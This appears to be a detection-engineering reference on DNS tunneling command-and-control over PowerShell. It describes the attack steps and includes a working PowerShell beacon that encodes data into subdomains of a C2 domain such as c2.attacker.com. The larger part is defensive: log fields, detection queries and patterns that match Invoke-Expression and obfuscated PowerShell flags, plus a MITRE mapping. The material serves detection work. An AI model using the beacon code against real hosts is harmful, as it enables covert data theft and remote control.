# Command and Control

## Application Layer Protocol: DNS Tunneling via PowerShell

### Technique Overview

DNS tunneling abuses the Domain Name System (DNS) protocol to establish a covert command-and-control (C2) channel. Because DNS is a foundational network protocol, it is almost universally permitted through firewalls and network security controls — even in highly restricted environments. This makes it an attractive channel for adversaries seeking persistent, low-noise communication with compromised hosts.

The core mechanism exploits the way DNS resolvers recursively forward queries to authoritative name servers. An adversary registers a domain and operates a rogue authoritative DNS server for that domain. The malware on the victim encodes C2 data (commands, responses, exfiltrated content) into DNS query fields — most commonly as subdomains in `A`, `TXT`, or `CNAME` record requests — and the authoritative server decodes that data and replies with encoded instructions embedded in the DNS response payload.

PowerShell is the predominant implementation vehicle on Windows because:
- It is present by default on all modern Windows systems
- It provides native access to .NET `System.Net.Dns` and raw socket APIs
- It can perform DNS lookups without spawning `nslookup.exe` or `Resolve-DnsName` processes
- Scripts can be injected in-memory, leaving minimal disk artifacts

**Key variants:**

- **Subdomain encoding**: Data is base32/base64-encoded into subdomain labels (e.g., `aGVsbG8.c2.attacker.com`). Each query carries a small chunk of data; C2 sessions are reconstructed server-side.
- **TXT record responses**: The authoritative server returns commands encoded in DNS TXT records, which support up to 255 bytes per string and multiple strings per record.
- **CNAME/MX chaining**: Less common; used to further blend traffic with legitimate DNS behavior.

**Prerequisites:**
- Attacker controls an authoritative DNS server for a registered domain
- Victim has outbound DNS permitted (UDP/TCP port 53, or DoH/DoT on 443/853)
- Initial code execution on the victim (typically via prior stage: phishing, exploit, etc.)
- No privileges beyond standard user required for outbound DNS queries

---

### Attack Steps

1. **Infrastructure Setup**: The attacker registers a domain (e.g., `updates-cdn.net`) and configures a VPS as the authoritative name server. A custom DNS server application (e.g., a Python script using `dnslib`, or `iodine`/`dns2tcp` for off-the-shelf tunneling) listens on UDP/TCP 53 and implements the C2 protocol.

2. **Payload Delivery**: The DNS tunneling agent is delivered to the victim via a prior-stage payload (phishing email, macro document, drive-by download). The agent is typically a PowerShell script or a .NET assembly loaded reflectively.

3. **Encoding Data for Exfiltration**: The PowerShell agent encodes outbound data (keystrokes, command output, file chunks) using base32 or base64 (with DNS-safe character substitutions), then chunks the data to fit within the 63-character subdomain label limit and the 253-character total FQDN limit.

   Example PowerShell encoding function:
   ```powershell
   function Encode-DnsLabel {
       param([string]$Data)
       $bytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
       $b64    = [Convert]::ToBase64String($bytes)
       # Replace base64 chars invalid in DNS labels
       $b64 -replace '\+','-' -replace '/','_' -replace '=',''
   }

   function Send-DnsBeacon {
       param([string]$SessionId, [string]$Chunk, [string]$C2Domain)
       $label  = Encode-DnsLabel $Chunk
       $fqdn   = "$label.$SessionId.$C2Domain"
       # Trigger DNS resolution — no process spawn, no disk write
       [System.Net.Dns]::GetHostAddresses($fqdn) | Out-Null
   }
   ```

4. **DNS Query Transmission**: The agent calls `[System.Net.Dns]::GetHostAddresses()` or `Resolve-DnsName` to issue queries. These traverse the recursive resolver chain and ultimately reach the attacker's authoritative server. No direct network connection to the C2 IP is required from the victim — all traffic appears as normal DNS to intermediary resolvers.

5. **Server-Side Decoding and Command Issuance**: The attacker's authoritative server logs incoming query labels, reassembles chunked data, decodes it, and returns commands encoded in DNS `A` record IP octets (4 bytes per record) or in `TXT` records (up to ~1400 bytes per response set).

   Example response encoding via TXT record (attacker-side, Python pseudocode):
   ```python
   def build_response(qname, command):
       encoded = base64.b32encode(command.encode()).decode()
       # Return command split across TXT strings
       return dns.TXT(encoded)
   ```

6. **Command Execution**: The agent decodes the DNS response, reconstructs the command string, and executes it via `Invoke-Expression` or `[ScriptBlock]::Create().Invoke()`. Output is re-encoded and exfiltrated in subsequent DNS queries, completing the bidirectional C2 loop.

7. **Beaconing**: The agent sleeps for a jittered interval (e.g., 30–300 seconds) between beacon cycles to avoid generating uniform query frequency patterns. Some implementations use a low-entropy `KeepAlive` query (a fixed label) to signal liveness without transmitting data.

---

### Detection Opportunities

- **High Volume of DNS Queries to a Single Domain (High Fidelity)**: Legitimate software rarely issues hundreds or thousands of DNS queries to a single domain within a short window. DNS tunnel traffic characteristically generates sustained, high-frequency queries to one registered domain with unique, high-entropy subdomains on each request. Alert on hosts issuing >50 unique subdomain queries to a single second-level domain within a 5-minute window.

- **High-Entropy Subdomain Labels (High Fidelity)**: Legitimate hostnames are human-readable (e.g., `api.github.com`). Encoded data produces random-looking subdomains with Shannon entropy typically >3.5 bits/character. Calculating entropy on the leftmost label of DNS queries is a reliable indicator. Payloads encoded with base32 (A–Z, 2–7) produce all-uppercase alphanumeric labels; base64url produces mixed-case with hyphens/underscores.

- **Unusually Long FQDN Lengths (High Fidelity)**: DNS tunneling payloads routinely produce FQDNs near the 253-character limit. Legitimate DNS queries average well under 60 characters. Flag queries where `length(fqdn) > 100` or `length(subdomain_label) > 50`.

- **`[System.Net.Dns]` API Usage Without Child Process (Medium Fidelity)**: DNS resolution via the .NET API (`System.Net.Dns::GetHostAddresses`) does not spawn `nslookup.exe` or `Resolve-DnsName`. However, PowerShell ScriptBlock logging (Event ID 4104) will capture the API call. Look for PowerShell scripts invoking `System.Net.Dns` in a loop or with dynamically constructed FQDN strings.

- **PowerShell Resolving Domains Not Previously Seen in Environment (Medium Fidelity)**: Correlate DNS queries from PowerShell processes against a baseline of known-good domains. A domain registered recently (<30 days) combined with high query volume from a non-browser process is a strong signal.

- **DNS over Non-Standard Ports or TCP 53 (Medium Fidelity)**: While standard DNS uses UDP/53, large payloads fall back to TCP/53. Tunneling tools may also attempt DNS-over-HTTPS (DoH) to bypass DNS inspection. Flag PowerShell network connections on port 443 to known DoH resolvers (`8.8.8.8`, `1.1.1.1`, `9.9.9.9`) if DoH is not sanctioned.

- **TXT Record Responses with High-Entropy Content (Medium Fidelity)**: Query DNS response logs or recursive resolver logs for `TXT` record responses with base64/base32-like content. Legitimate TXT records are mostly SPF, DKIM, or verification tokens — these have predictable formats (e.g., `v=spf1 ...`). Random-looking TXT responses are anomalous.

- **Evasion Techniques**:
  - **Domain Generation Algorithms (DGAs)**: Attackers may cycle through many domains to avoid blocklists; correlate on subdomain entropy rather than domain reputation alone.
  - **Low-and-Slow Beaconing**: Reduced query rates (one query per minute) lower detection probability against volume-based rules; use entropy-based detection as a complement.
  - **Legitimate Resolvers as Proxies**: Using `8.8.8.8` or the corporate recursive resolver means the victim never directly contacts the C2 IP; block on domain/label patterns rather than IPs.
  - **DNS over HTTPS (DoH)**: Bypasses DNS inspection entirely; enforce DoH blocking at the network perimeter and proxy all DNS through monitored resolvers.
  - **Short TTL abuse**: Setting record TTL to 0 prevents caching, forcing repeated resolver traversal; this also removes evidence from resolver caches.

- **False Positives**:
  - CDN platforms (Akamai, Cloudflare, Fastly) generate high subdomain query volumes; baseline and allowlist known CDN domains.
  - Dynamic DNS services and split-horizon DNS environments may produce unusual subdomain patterns.
  - Certificate Transparency log fetching and OCSP/CRL checks can produce periodic DNS bursts.
  - Some software update mechanisms use long, hash-based subdomains for cache-busting.

---

### Data Sources & Log Fields

**Windows Event Log — PowerShell (requires Module/ScriptBlock logging enabled):**

- `Event ID 4103` (Module Logging): PowerShell module execution with pipeline output
  - `Payload`: Full command text; search for `System.Net.Dns`, `Resolve-DnsName`, `nslookup`
  - `HostApplication`: Parent process context (look for `powershell.exe` invoked without `-File` argument)

- `Event ID 4104` (ScriptBlock Logging): Records every script block before execution
  - `ScriptBlockText`: Full deobfuscated script content; flag invocations of `[System.Net.Dns]::GetHostAddresses` inside loops, or Base64/Base32 encoding routines combined with DNS calls
  - `Path`: Script file path (empty = in-memory execution)

**Sysmon (requires Sysmon deployment with network logging):**

- `Event ID 1` (Process Create):
  - `Image`: Watch for `powershell.exe`, `pwsh.exe`
  - `CommandLine`: Flag `-EncodedCommand`, `-NoP`, `-W Hidden`, `-Exec Bypass` combinations
  - `ParentImage`: Unusual parents (e.g., `winword.exe`, `excel.exe`, `mshta.exe`)

- `Event ID 22` (DNS Query — requires Sysmon v11+):
  - `QueryName`: The FQDN queried; primary field for entropy analysis and length checks
  - `QueryResults`: Returned IP addresses or CNAME chains
  - `Image`: Process that issued the query; flag `powershell.exe` querying domains with high-entropy subdomains

- `Event ID 3` (Network Connection):
  - `Image`: `powershell.exe`
  - `DestinationPort`: Flag 53 (UDP/TCP DNS) and 853 (DoT) from PowerShell directly
  - `DestinationIp`: Check against threat intelligence for known DNS tunnel C2 infrastructure

**DNS Recursive Resolver Logs (Windows DNS Server / BIND / Unbound):**

- Fields to collect per query:
  - `client_ip`: Source host IP; correlate with asset inventory
  - `qname`: Full query name (FQDN); primary detection field
  - `qtype`: Record type (`A`, `TXT`, `CNAME`, `MX`); flag disproportionate `TXT` queries from a single host
  - `response_code`: `NXDOMAIN` storms can indicate DGA-style iteration
  - `timestamp`: Used for frequency/rate analysis per source IP

**Windows DNS Debug Log (enable via DNS Manager or registry):**
```powershell
# Enable DNS debug logging on Windows DNS Server
Set-DnsServerDiagnostics -All $true

# Query DNS debug log (default path)
Get-Content "C:\Windows\System32\dns\dns.log" | Select-String -Pattern "TXT|base"
```

**Network / NDR Data Sources:**

- **NetFlow / IPFIX**: Identify hosts with sustained UDP/53 flows to external resolvers; DNS tunnels produce continuous, steady-state flow records unlike bursty legitimate DNS
- **Full-packet capture (PCAP)**: Required to decode TXT record content; use Zeek `dns.log` for structured DNS telemetry
  - Zeek DNS log fields: `ts`, `id.orig_h`, `query`, `qtype_name`, `answers`, `TTLs`

**Command-line log access examples:**
```powershell
# Pull PowerShell ScriptBlock events with DNS-related content
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.Id -eq 4104 -and $_.Message -match "Net\.Dns|Resolve-DnsName" } |
    Select-Object TimeCreated, Message | Format-List

# Pull Sysmon DNS query events for powershell.exe
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 22 -and $_.Message -match "powershell" } |
    Select-Object TimeCreated, Message
```

---

### Pseudocode Queries

**High Fidelity: PowerShell DNS API Call with Encoded Subdomain**
```
event.type == "script_block_execution" AND
process.name IN ["powershell.exe", "pwsh.exe"] AND
process.script_block_text MATCHES "(?i)(System\.Net\.Dns|Resolve-DnsName|nslookup)" AND
process.script_block_text MATCHES "(?i)(GetHostAddresses|GetHostEntry)" AND
(
  process.script_block_text MATCHES "(?i)(base64|base32|Convert\.ToBase64|FromBase64)" OR
  process.script_block_text MATCHES "(?i)(Invoke-Expression|IEX|ScriptBlock::Create)"
)
```

**High Fidelity: High-Entropy DNS Subdomain from PowerShell (Sysmon Event 22)**
```
event.type == "dns_query" AND
process.name IN ["powershell.exe", "pwsh.exe"] AND
dns.query.name MATCHES "^[a-zA-Z0-9\-_]{40,}\." AND
// Entropy check: label length >40 chars with no vowel-consonant natural language pattern
length(dns.query.name) > 80
```

**High Fidelity: Excessive Unique DNS Subdomain Queries to Single Domain**
```
// Aggregate over 5-minute windows per source host
event.type == "dns_query" AND
process.name IN ["powershell.exe", "pwsh.exe"] AND
// Group by: source_host, registered_domain (second-level domain + TLD)
// Alert when: count(distinct subdomain) > 50 within window
count(distinct(dns.query.subdomain), window=5m, groupby=[host.name, dns.registered_domain]) > 50
```

**High Fidelity: Anomalously Long DNS FQDN**
```
event.type == "dns_query" AND
length(dns.query.name) > 120 AND
process.name NOT IN ["chrome.exe", "firefox.exe", "msedge.exe", "svchost.exe"] AND
dns.query.type IN ["A", "TXT", "CNAME"]
```

**Medium Fidelity: PowerShell Network Connection on Port 53**
```
event.type == "network_connection" AND
process.name IN ["powershell.exe", "pwsh.exe"] AND
network.destination.port IN [53, 853] AND
network.protocol IN ["udp", "tcp"]
```

**Medium Fidelity: TXT Record Response with High-Entropy Content**
```
event.type == "dns_response" AND
dns.query.type == "TXT" AND
dns.response.data MATCHES "^[A-Z2-7]{20,}={0,6}$" AND   // base32 pattern
NOT dns.response.data MATCHES "^v=(spf1|DMARC1|DKIM1)"  // exclude SPF/DKIM/DMARC
```

**Medium Fidelity: Obfuscated PowerShell with DNS Activity**
```
event.type == "process_start" AND
process.name IN ["powershell.exe", "pwsh.exe"] AND
(
  process.command_line MATCHES "(?i)-EncodedCommand" OR
  process.command_line MATCHES "(?i)-Exec(ution)?(\s+)?Bypass" OR
  process.command_line MATCHES "(?i)-W(indow)?(\s+)?Hid(den)?"
) AND
process.parent.name NOT IN ["explorer.exe", "services.exe", "svchost.exe", 
                             "msiexec.exe", "taskhostw.exe"]
```

**Behavioral: DNS Beaconing Pattern (Sustained Low-Rate Queries)**
```
// Detect jittered beaconing: regular but slightly randomized query intervals
event.type == "dns_query" AND
// Group: source_host, registered_domain
// Metric: stddev(inter-query interval) / mean(inter-query interval) < 0.4
//         (low coefficient of variation = regular beaconing)
// AND total query count over 1 hour > 20
statistical_beacon_score(
  groupby=[host.name, dns.registered_domain],
  window=1h,
  min_events=20,
  cv_threshold=0.4
) == true AND
process.name IN ["powershell.exe", "pwsh.exe"]
```

---

### MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|--------|--------------|----------------|
| Command and Control | T1071.004 | Application Layer Protocol: DNS |
| Command and Control | T1132.001 | Data Encoding: Standard Encoding |
| Command and Control | T1568.002 | Dynamic Resolution: Domain Generation Algorithms |
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol |
| Defense Evasion | T1027 | Obfuscated Files or Information |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell |
